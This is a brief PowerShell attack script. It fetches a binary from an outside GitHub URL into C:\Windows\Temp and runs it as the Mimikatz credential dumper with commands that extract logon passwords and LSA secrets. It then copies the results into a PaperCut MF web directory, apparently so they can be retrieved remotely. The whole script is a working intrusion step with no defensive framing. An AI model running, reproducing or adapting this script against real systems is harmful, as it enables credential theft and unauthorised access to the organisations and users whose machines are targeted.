$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -UseBasicParsing `
    https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main/mimi.bin `
    -OutFile C:\Windows\Temp\mimi.bin
Copy-Item C:\Windows\Temp\mimi.bin C:\Windows\Temp\mimi.exe -Force
& C:\Windows\Temp\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" `
    "lsadump::secrets" "exit" > C:\Windows\Temp\mimi.txt 2>&1
Copy-Item C:\Windows\Temp\mimi.txt `
    "C:\Program Files\PaperCut MF\server\custom\web\mimi-ext0039.txt" -Force
